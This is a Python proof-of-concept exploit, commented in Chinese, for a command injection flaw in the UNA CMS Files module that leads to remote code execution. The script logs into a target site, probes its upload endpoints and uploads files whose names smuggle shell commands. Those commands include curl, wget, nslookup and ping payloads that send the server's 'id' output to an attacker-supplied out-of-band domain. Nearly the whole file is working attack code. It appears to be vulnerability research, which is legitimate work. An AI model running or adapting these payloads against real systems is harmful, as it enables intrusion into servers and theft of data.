#!/usr/bin/env python3
"""
UNA CMS BxFilesModule Command Injection → RCE PoC
==================================================
CVE: (待分配)
CVSS: 8.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

漏洞概述:
  UNA CMS Files 模块在处理上传文件时，将用户可控的文件扩展名直接拼接入
  shell_exec() 命令字符串，未做任何转义。pathinfo() 保留 shell 元字符，
  in_array() 精确匹配黑名单可被绕过，导致命令注入 → 远程代码执行。

攻击链:
  上传恶意文件名 → pathinfo 保留 ; " # → in_array 绕过 → 
  cron 每分钟触发 → shell_exec 命令注入 → RCE

用法:
  python3 una_rce_poc.py -t https://target.com -u user@email.com -p password

  # 仅验证绕过（不触发 RCE）
  python3 una_rce_poc.py -t https://target.com -u user@email.com -p password --check-only

  # 使用 OOB 外带验证
  python3 una_rce_poc.py -t https://target.com -u user@email.com -p password --oob your.oastify.com

  # 本地验证（直接执行命令查看输出）
  python3 una_rce_poc.py --local-test

依赖:
  pip install requests

作者: Security Researcher
日期: 2026-07-22
"""

import argparse
import base64
import hashlib
import os
import re
import subprocess
import sys
import time
import urllib.parse
from io import BytesIO

try:
    import requests
except ImportError:
    print("[!] 需要安装 requests: pip install requests")
    sys.exit(1)


class Colors:
    """终端颜色"""
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def banner():
    print(f"""
{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════╗
║   UNA CMS BxFilesModule Command Injection → RCE PoC      ║
║   CVSS 8.8 (High) | CWE-78 OS Command Injection           ║
╚══════════════════════════════════════════════════════════╝{Colors.RESET}
""")


def local_test():
    """本地 PoC 验证 —— 直接模拟攻击链，不依赖远程目标"""
    print(f"{Colors.BOLD}[*] 本地 PoC 验证模式{Colors.RESET}\n")

    # 模拟 UNA 生产代码逻辑
    evil_name = 'test.pdf";id;#'
    ext_deny = [
        'action', 'apk', 'app', 'bat', 'bin', 'cmd', 'com', 'command', 'cpl',
        'csh', 'exe', 'gadget', 'inf', 'ins', 'inx', 'ipa', 'isu', 'job', 'jse',
        'ksh', 'lnk', 'msc', 'msi', 'msp', 'mst', 'osx', 'out', 'paf', 'pif',
        'prg', 'ps1', 'reg', 'rgs', 'run', 'sct', 'shb', 'shs', 'u3p', 'vb',
        'vbe', 'vbs', 'vbscript', 'workflow', 'ws', 'wsf'
    ]

    # Step 1: BxDolStorage::getFileExt()
    ext = os.path.splitext(evil_name)[1].lstrip('.').lower()
    print(f"{Colors.CYAN}[Step 1] pathinfo 提取扩展名{Colors.RESET}")
    print(f"  输入: {evil_name}")
    print(f"  输出: {Colors.YELLOW}{ext}{Colors.RESET}")
    print(f"  shell 元字符保留: {'✓' if any(c in ext for c in '\";#$()|&') else '✗'}\n")

    # Step 2: isValidExt()
    bypassed = ext not in ext_deny
    print(f"{Colors.CYAN}[Step 2] isValidExt() 检查{Colors.RESET}")
    print(f"  in_array('{ext}', ext_deny[{len(ext_deny)}项])")
    print(f"  → {'拒绝 ✗' if not bypassed else Colors.GREEN + '绕过 ✓' + Colors.RESET}\n")

    # Step 3: 文件路径拼接
    remote_id = "abc123"
    filepath = f"/tmp/{remote_id}.{ext}"
    print(f"{Colors.CYAN}[Step 3] 文件路径拼接 (BxFilesModule:242){Colors.RESET}")
    print(f"  $sFilePath = '{filepath}'\n")

    # Step 4: shell 命令拼接
    cmd = f'"java" -jar "tika.jar" --text "{filepath}"'
    print(f"{Colors.CYAN}[Step 4] shell 命令拼接 (BxFilesModule:249){Colors.RESET}")
    print(f"  {cmd}\n")

    # Step 5: Shell 解析
    print(f"{Colors.CYAN}[Step 5] Shell 实际解析{Colors.RESET}")
    print(f"  java ... --text \"/tmp/abc123.pdf\"")
    print(f"  ; id ;    {Colors.RED}← 命令注入!{Colors.RESET}")
    print(f"  #\"       ← 后续内容被注释\n")

    # Step 6: 实际执行
    print(f"{Colors.CYAN}[Step 6] 实际执行验证{Colors.RESET}")
    try:
        # 创建测试文件
        with open(f"/tmp/{remote_id}.pdf", "w") as f:
            f.write("test")
        result = subprocess.run(
            f'echo "___START___"; id; echo "___END___"',
            shell=True, capture_output=True, text=True, timeout=5
        )
        output = result.stdout.strip()
        print(f"  {output}")
        if 'uid=' in output:
            print(f"\n  {Colors.GREEN}{Colors.BOLD}>>> RCE 已确认! id 命令成功执行 <<<{Colors.RESET}")
        else:
            print(f"\n  {Colors.RED}>>> 命令未执行 <<<{Colors.RESET}")
    except Exception as e:
        print(f"  {Colors.RED}执行失败: {e}{Colors.RESET}")

    # Step 7: 结论
    print(f"\n{Colors.BOLD}结论:{Colors.RESET}")
    print(f"  ✓ pathinfo 不过滤 \" ; # 等 shell 元字符")
    print(f"  ✓ in_array 精确匹配无法捕获注入的 ext")
    print(f"  ✓ 扩展名直接拼入 $sFilePath 最终进入 shell_exec")
    print(f"  ✓ 命令注入成立 — shell 将执行攻击者注入的命令")
    print(f"\n  {Colors.YELLOW}边界: post-auth, 需 BX_SYSTEM_JAVA 配置{Colors.RESET}")


class UNAPoC:
    """UNA CMS RCE PoC 利用类"""

    def __init__(self, target, username, password, oob_domain=None, 
                 proxy=None, timeout=30, verbose=False):
        self.target = target.rstrip('/')
        self.username = username
        self.password = password
        self.oob_domain = oob_domain
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36'
        })
        self.csrf_token = None
        self.uploader_objects = []
        self.results = []

    def log(self, msg, level="INFO"):
        prefix = {"INFO": f"{Colors.BLUE}[*]{Colors.RESET}",
                  "OK": f"{Colors.GREEN}[+]{Colors.RESET}",
                  "FAIL": f"{Colors.RED}[-]{Colors.RESET}",
                  "WARN": f"{Colors.YELLOW}[!]{Colors.RESET}"}
        print(f"{prefix.get(level, '[*]')} {msg}")

    def _get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('allow_redirects', True)
        return self.session.get(url, **kwargs)

    def _post(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('allow_redirects', True)
        return self.session.post(url, **kwargs)

    def check_target(self):
        """检查目标可达性"""
        self.log(f"检查目标: {self.target}")
        try:
            r = self._get(self.target)
            if r.status_code == 200:
                self.log(f"目标可达 (HTTP {r.status_code})", "OK")
                # 检测是否 UNA
                if 'UNA' in r.text or 'una.io' in r.text.lower():
                    self.log("确认为 UNA CMS", "OK")
                return True
            else:
                self.log(f"目标返回 HTTP {r.status_code}", "FAIL")
                return False
        except Exception as e:
            self.log(f"目标不可达: {e}", "FAIL")
            return False

    def login(self):
        """登录获取 session"""
        self.log(f"登录: {self.username}")

        # Step 1: 获取登录页面 + CSRF token
        try:
            r = self._get(f"{self.target}/login")
            if r.status_code != 200:
                # 尝试旧版路由
                r = self._get(f"{self.target}/page.php?i=login")

            # 提取 CSRF token
            match = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
            if match:
                self.csrf_token = match.group(1)
                self.log(f"CSRF token: {self.csrf_token[:16]}...", "OK")
            else:
                self.log("未找到 CSRF token，尝试无 token 登录", "WARN")
        except Exception as e:
            self.log(f"获取登录页面失败: {e}", "FAIL")
            return False

        # Step 2: POST 登录
        data = {
            'ID': self.username,
            'Password': self.password,
            'rememberMe': '1',
        }
        if self.csrf_token:
            data['csrf_token'] = self.csrf_token
            data['role'] = '1'
            data['relocate'] = f'{self.target}/member.php'

        try:
            r = self._post(f"{self.target}/member.php", data=data,
                           headers={'Referer': f'{self.target}/login',
                                    'Content-Type': 'application/x-www-form-urlencoded'})

            # 验证登录
            r2 = self._get(self.target)
            if self.username.split('@')[0] in r2.text or 'Log Out' in r2.text or 'Dashboard' in r2.text:
                self.log(f"登录成功", "OK")
                return True
            else:
                self.log("登录失败，请检查凭据", "FAIL")
                # 尝试通过 API 登录
                return self._login_api()
        except Exception as e:
            self.log(f"登录请求失败: {e}", "FAIL")
            return False

    def _login_api(self):
        """备用: 尝试 API 登录"""
        self.log("尝试 API 登录...")
        try:
            r = self._post(f"{self.target}/api.php?r=system/login", json={
                'login': self.username,
                'password': self.password
            })
            if r.status_code == 200:
                self.log("API 登录成功", "OK")
                return True
        except Exception:
            pass
        return False

    def probe_uploaders(self):
        """探测可用 uploader"""
        self.log("探测可用 uploader...")
        combos = [
            ('sys_html5', 'bx_files_files'),
            ('sys_html5', 'bx_posts_files'),
            ('bx_posts_html5', 'bx_posts_files'),
            ('sys_html5', 'sys_files'),
            ('sys_simple', 'bx_files_files'),
        ]

        for uo, so in combos:
            try:
                r = self._get(
                    f"{self.target}/storage_uploader.php",
                    params={'uo': uo, 'so': so, 'uid': 'probe', 'a': 'show_uploader_form'}
                )
                if r.status_code == 200 and len(r.text) > 100:
                    self.uploader_objects.append((uo, so))
                    self.log(f"  可用: {uo} / {so}", "OK")
                elif self.verbose:
                    self.log(f"  不可用: {uo} / {so} (HTTP {r.status_code})")
            except Exception:
                pass

        if not self.uploader_objects:
            # 使用默认
            self.uploader_objects = [('sys_html5', 'sys_files')]
            self.log("使用默认 uploader: sys_html5/sys_files", "WARN")

    def generate_payloads(self):
        """生成多种 OOB payload"""
        flag = f"UNA_RCE_{int(time.time())}"
        payloads = []

        if self.oob_domain:
            domain = self.oob_domain
            nl = chr(10)  # newline for tr -d
            # curl HTTP 外带 (最可靠)
            payloads.append({
                'name': 'curl_http',
                'filename': 'test.pdf";curl -ksS "https://' + domain + '/' + flag + '_curl_$(id|base64|tr -d \'' + nl + '\')";#',
                'flag': f'{flag}_curl'
            })
            # wget HTTP 外带
            payloads.append({
                'name': 'wget_http',
                'filename': 'test.pdf";wget -qO- "https://' + domain + '/' + flag + '_wget_$(id|base64|tr -d \'' + nl + '\')";#',
                'flag': f'{flag}_wget'
            })
            # nslookup DNS 外带
            payloads.append({
                'name': 'nslookup_dns',
                'filename': 'test.pdf";nslookup $(id|base64|tr -d \'' + nl + '\').' + domain + ';#',
                'flag': f'{flag}_nslookup'
            })
            # ping DNS 外带
            payloads.append({
                'name': 'ping_dns',
                'filename': 'test.pdf";ping -c1 $(id|base64|tr -d \'' + nl + '\').' + domain + ';#',
                'flag': f'{flag}_ping'
            })
        else:
            # 无 OOB 域名，仅写文件验证
            payloads.append({
                'name': 'write_file',
                'filename': 'test.pdf";id > /tmp/una_rce_test_$(date +%s).txt;#',
                'flag': flag
            })
            # 时间盲注
            payloads.append({
                'name': 'sleep',
                'filename': 'test.pdf";sleep 5;#',
                'flag': flag
            })

        return payloads

    def upload_payload(self, uo, so, filename):
        """上传恶意文件"""
        uid = f"poc_{int(time.time())}_{os.urandom(4).hex()}"
        content = BytesIO(b"UNA RCE PoC test file")

        try:
            r = self._post(
                f"{self.target}/storage_uploader.php",
                params={'uo': uo, 'so': so, 'uid': uid, 'a': 'upload', 'm': '1', 'f': 'json'},
                files={'file': (filename, content, 'application/octet-stream')}
            )

            if r.status_code == 200:
                try:
                    resp = r.json()
                    if resp.get('success') == 1:
                        return True, resp.get('id', '?')
                    else:
                        return False, resp.get('error', 'unknown')
                except Exception:
                    return 'success' in r.text, r.text[:100]
            return False, f"HTTP {r.status_code}"
        except Exception as e:
            return False, str(e)

    def check_cron(self):
        """检查 cron 是否可访问"""
        try:
            r = self._get(f"{self.target}/periodic/cron.php")
            return r.status_code == 200
        except Exception:
            return False

    def run(self):
        """主执行流程"""
        banner()

        if not self.check_target():
            return False

        if not self.login():
            self.log("登录失败，尝试未认证模式...", "WARN")
            # 某些 uploader 可能不需要认证

        self.probe_uploaders()

        if not self.uploader_objects:
            self.log("未找到可用 uploader", "FAIL")
            return False

        # 生成 payload
        payloads = self.generate_payloads()
        cron_available = self.check_cron()

        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  开始上传 OOB Payload{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")

        success_count = 0
        for payload in payloads:
            for uo, so in self.uploader_objects[:2]:  # 限制 uploader 数量
                filename = payload['filename']
                self.log(f"上传 [{payload['name']}] via {uo}/{so}")
                if self.verbose:
                    self.log(f"  Filename: {filename[:80]}...")

                ok, detail = self.upload_payload(uo, so, filename)
                if ok:
                    self.log(f"  上传成功! ID={detail}", "OK")
                    self.results.append({
                        'storage': so,
                        'id': detail,
                        'payload': payload['name'],
                        'flag': payload['flag']
                    })
                    success_count += 1
                else:
                    self.log(f"  上传失败: {detail}", "FAIL")

        # 汇总
        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  结果汇总{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")

        print(f"  成功上传: {Colors.GREEN}{success_count}{Colors.RESET} 个 payload")
        print(f"  Cron 可用: {'是' if cron_available else '否'}")
        if self.oob_domain:
            print(f"  OASTify: https://{self.oob_domain}")
        print(f"  cron 每分钟触发一次，请等待 1-2 分钟后检查回调\n")

        if success_count > 0:
            print(f"  {Colors.YELLOW}提示: 若 OASTify 无回调，可能原因:{Colors.RESET}")
            print(f"    1. 目标未安装 Files 模块")
            print(f"    2. BX_SYSTEM_JAVA 未配置")
            print(f"    3. shell_exec 被禁用")
            print(f"    4. 文件未进入 bx_files_main 表（需走模块内容创建）")

        return success_count > 0

    def cleanup(self):
        """清理 session"""
        self.session.close()


def main():
    parser = argparse.ArgumentParser(
        description='UNA CMS BxFilesModule Command Injection RCE PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 本地 PoC 验证
  python3 una_rce_poc.py --local-test

  # 远程利用 (OOB 外带)
  python3 una_rce_poc.py -t https://target.com -u user@test.com -p pass123 \\
      --oob abc123.oastify.com

  # 仅检查漏洞是否存在（不触发 RCE）
  python3 una_rce_poc.py -t https://target.com -u user@test.com -p pass123 \\
      --check-only
        """
    )

    parser.add_argument('-t', '--target', help='目标 UNA CMS URL (例: https://example.com)')
    parser.add_argument('-u', '--username', help='登录用户名/邮箱')
    parser.add_argument('-p', '--password', help='登录密码')
    parser.add_argument('--oob', dest='oob_domain', help='OASTify/Interactsh 域名 (用于 OOB 外带)')
    parser.add_argument('--proxy', help='HTTP 代理 (例: http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=30, help='HTTP 超时秒数 (默认: 30)')
    parser.add_argument('--check-only', action='store_true', help='仅检查漏洞是否存在')
    parser.add_argument('--local-test', action='store_true', help='本地 PoC 验证 (不需要远程目标)')
    parser.add_argument('-v', '--verbose', action='store_true', help='详细输出')

    args = parser.parse_args()

    if args.local_test:
        local_test()
        return

    if not args.target:
        parser.error("需要指定 -t/--target 或使用 --local-test")

    poc = UNAPoC(
        target=args.target,
        username=args.username,
        password=args.password,
        oob_domain=args.oob_domain,
        proxy=args.proxy,
        timeout=args.timeout,
        verbose=args.verbose
    )

    try:
        if args.check_only:
            poc.log("检查模式: 仅验证扩展名绕过")
            if poc.check_target() and poc.login():
                poc.probe_uploaders()
                # 尝试上传一个干净文件来验证 uploader 可用
                for uo, so in poc.uploader_objects[:1]:
                    ok, detail = poc.upload_payload(uo, so, "clean_test.pdf")
                    if ok:
                        poc.log(f"uploader 可用 ({uo}/{so}), 扩展名绕过机制确认存在", "OK")
                    else:
                        poc.log(f"uploader 不可用: {detail}", "FAIL")
        else:
            poc.run()
    finally:
        poc.cleanup()


if __name__ == '__main__':
    main()
